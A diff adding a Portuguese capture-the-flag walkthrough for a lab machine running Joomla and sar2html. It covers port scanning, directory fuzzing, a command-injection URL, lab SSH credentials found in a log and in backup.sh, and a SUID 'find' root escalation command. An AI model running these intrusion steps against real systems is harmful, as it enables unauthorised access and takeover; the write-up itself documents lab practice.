@@ -1,0 +1,152 @@
+IP ALVO: 10.64.178.209
+
+--> sudo rustscan -a 10.64.178.209
+
+Open 10.64.178.209:21
+Open 10.64.178.209:80
+Open 10.64.178.209:10000
+Open 10.64.178.209:55007
+
+--> sudo nmap -sV -sC -Pn -p 21,80,10000,55007 10.64.178.209
+
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.200.114
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
+|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
+|_http-server-header: MiniServ/1.930
+55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
+|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
+|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+FTP LOGIN ANONYMOUS ACCEPT!
+
+
+--> ffuf -u http://10.64.178.209/FUZZ -H "Host: 10.64.178.209" -w ~/Downloads/wordlists/admin.txt -i -c -mc 200,301,403 -ic
+
+robots.txt              [Status: 200, Size: 257, Words: 46, Lines: 16, Duration: 156ms]
+.hta                    [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 152ms]
+.htpasswd               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 152ms]
+.htaccess               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 152ms]
+joomla                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 169ms]
+manual                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 156ms]
+robots.txt              [Status: 200, Size: 257, Words: 46, Lines: 16, Duration: 158ms]
+server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 151ms]
+.htaccess               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 204ms]
+.hta                    [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 205ms]
+.htpasswd               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 205ms]
+
+--> ffuf -u http://10.64.178.209/joomla/FUZZ -H "Host: 10.64.178.209" -w ~/Downloads/wordlists/admin.txt -i -c -mc 200,301,403 -ic
+
+administrator           [Status: 301, Size: 329, Words: 20, Lines: 10, Duration: 155ms]
+images                  [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 270ms]
+tmp                     [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 181ms]
+cache                   [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 164ms]
+
+--> perl joomscan.pl --url http://10.64.178.209/joomla/
+
+[+] Detecting Joomla Version
+[++] Joomla 3.9.12dev		--> interessante
+
+[+] Checking Directory Listing
+[++] directory has directory listing:
+
+http://10.64.178.209/joomla/administrator/components
+http://10.64.178.209/joomla/administrator/modules
+http://10.64.178.209/joomla/administrator/templates
+http://10.64.178.209/joomla/images/banners
+
+[+] admin finder
+[++] Admin page : http://10.64.178.209/joomla/administrator/
+
+SENHA ENCONTRADA EM /robots.txt
+
+--> 079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
+
+--> OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK
+
+--> 99b0660cd95adea327c54182baa51584
+
+--> kidding --> ou seja, foi apenas zoeira do ctf isso aqui
+
+LOGANDO PELO FTP: ftp:ftp
+
+--> .info.txt
+--> Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
+--> Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
+
+
+--> http://10.64.178.209/joomla/_test/index.php?plot=id --> url contém um CMDi
+--> searchsploit sar2html 3.2.1 Command Execution
+--> encontrei o arquivo: log.txt
+
+CONTEÚDO ARQUIVO: log.txt
+
+Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
+Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
+Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
+Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
+Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
+Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
+Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
+Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
+
+
+--> Usernames: pentest, basterd
+--> Password: superduperp@$$
+
+--> Login SSH: basterd:superduperp@$$
+--> USER=stoner #superduperp@$$no1knows --> encontrei ao ler o arquivo backup.sh
+
+SSH login stoner: stoner:superduperp@$$no1knows
+
+procurando arquivos com SUID BIT:
+
+--> find / -user root -perm -4000 2>/dev/null
+	|_> /usr/bin/find
+		|_> find . -exec /bin/sh -p \; -quit
+			|_> virei root!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
